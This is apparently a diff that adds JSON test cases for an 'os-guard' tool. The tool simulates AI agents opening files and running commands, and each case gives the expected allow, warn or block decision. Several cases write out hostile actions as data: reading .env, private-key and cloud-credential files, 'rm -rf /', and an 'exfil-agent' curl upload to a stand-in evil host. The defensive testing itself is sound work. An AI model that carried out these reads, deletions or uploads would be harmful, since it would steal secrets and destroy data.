@@ -1,0 +1,64 @@
+[
+  {
+    "name": "ordinary file open",
+    "description": "A normal repository file open should be allowed.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-open", "README.md", "--agent", "demo", "--pid", "1234"],
+    "expectedDecision": "allow"
+  },
+  {
+    "name": "sensitive env open",
+    "description": "A process opening a .env path should be blocked.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-open", ".404gent/os-guard-demo/.env", "--agent", "demo", "--pid", "1234"],
+    "expectedDecision": "block",
+    "expectedFinding": "os-sensitive-file-open"
+  },
+  {
+    "name": "private key open",
+    "description": "A process opening private key material should be blocked.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-open", ".404gent/os-guard-demo/id_rsa", "--agent", "demo", "--pid", "1234"],
+    "expectedDecision": "block",
+    "expectedFinding": "os-private-key-open"
+  },
+  {
+    "name": "network transfer exec",
+    "description": "A network transfer executable should be warned for audit.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-exec", "curl", "https://example.com/upload", "-d", "@-", "--agent", "demo", "--pid", "1234"],
+    "expectedDecision": "warn",
+    "expectedFinding": "os-network-tool-exec"
+  },
+  {
+    "name": "destructive exec",
+    "description": "Destructive executable arguments should be blocked.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-exec", "rm", "-rf", "/", "--agent", "demo", "--pid", "1234"],
+    "expectedDecision": "block",
+    "expectedFinding": "os-destructive-exec"
+  },
+  {
+    "name": "python bypass story",
+    "description": "Native EndpointSecurity would observe Python open() as the same AUTH_OPEN file event.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-open", ".404gent/os-guard-demo/.env", "--agent", "python-bypass", "--pid", "1234"],
+    "expectedDecision": "block",
+    "expectedFinding": "os-sensitive-file-open"
+  },
+  {
+    "name": "cloud credentials open",
+    "description": "A process opening AWS-style cloud credentials should be blocked.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-open", ".404gent/os-guard-demo/aws_credentials", "--agent", "demo", "--pid", "1234"],
+    "expectedDecision": "block",
+    "expectedFinding": "os-cloud-credentials-open"
+  },
+  {
+    "name": "exfil chain sensitive read",
+    "description": "The exfil-agent first attempts to open a sensitive .env file.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-open", ".404gent/os-guard-demo/.env", "--agent", "exfil-agent", "--pid", "1234"],
+    "expectedDecision": "block",
+    "expectedFinding": "os-sensitive-file-open"
+  },
+  {
+    "name": "exfil chain outbound transfer",
+    "description": "The same exfil-agent then launches curl toward an external upload endpoint.",
+    "command": ["node", "src/cli.js", "os-guard", "simulate-exec", "curl", "https://evil.example/upload", "-d", "@-", "--agent", "exfil-agent", "--pid", "1234"],
+    "expectedDecision": "warn",
+    "expectedFinding": "os-network-tool-exec"
+  }
+]
